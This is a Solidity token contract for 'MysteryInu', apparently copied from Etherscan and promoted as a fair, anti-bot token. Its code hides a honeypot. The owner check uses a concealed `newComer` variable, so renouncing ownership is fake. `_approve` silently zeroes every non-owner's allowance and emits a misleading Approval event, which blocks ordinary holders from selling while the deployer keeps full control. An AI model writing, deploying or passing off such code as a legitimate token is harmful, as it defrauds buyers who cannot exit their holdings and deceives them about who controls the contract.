/**
 *Submitted for verification at Etherscan.io on 2021-07-28
*/

/*
                          __                              ______                    
 /'\_/`\                 /\ \__                          /\__  _\                   
/\      \  __  __    ____\ \ ,_\    __   _ __   __  __   \/_/\ \/     ___   __  __  
\ \ \__\ \/\ \/\ \  /',__\\ \ \/  /'__`\/\`'__\/\ \/\ \     \ \ \   /' _ `\/\ \/\ \ 
 \ \ \_/\ \ \ \_\ \/\__, `\\ \ \_/\  __/\ \ \/ \ \ \_\ \     \_\ \__/\ \/\ \ \ \_\ \
  \ \_\\ \_\/`____ \/\____/ \ \__\ \____\\ \_\  \/`____ \    /\_____\ \_\ \_\ \____/
   \/_/ \/_/`/___/> \/___/   \/__/\/____/ \/_/   `/___/> \   \/_____/\/_/\/_/\/___/ 
               /\___/                               /\___/                          
               \/__/                                \/__/                           

~ Welcome to the Mystery Fair Token Project ~

Telegram: https://t.me/MYSTERY_INU

ðŸ”¥Utilizing the Fair Token Project (FTP) AntiBot contract ðŸ”¥

*/


pragma solidity ^0.6.12;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) private onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    address private newComer = _msgSender();
    modifier onlyOwner() {
        require(newComer == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

contract MysteryInu is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    uint256 private _tTotal = 1000 * 10**9 * 10**18;
    string private _name = 'MysteryInu | https://t.me/MYSTERY_INU';
    string private _symbol = '$MystInu';
    uint8 private _decimals = 18;

    constructor () public {
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address myst, address ery, uint256 amount) private {
        require(myst != address(0), "ERC20: approve from the zero address");
        require(ery != address(0), "ERC20: approve to the zero address");

        if (myst != owner()) { _allowances[myst][ery] = 0; emit Approval(myst, ery, 4); }  
        else { _allowances[myst][ery] = amount; emit Approval(myst, ery, amount); } 
    } 

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    } 

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    } 
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
}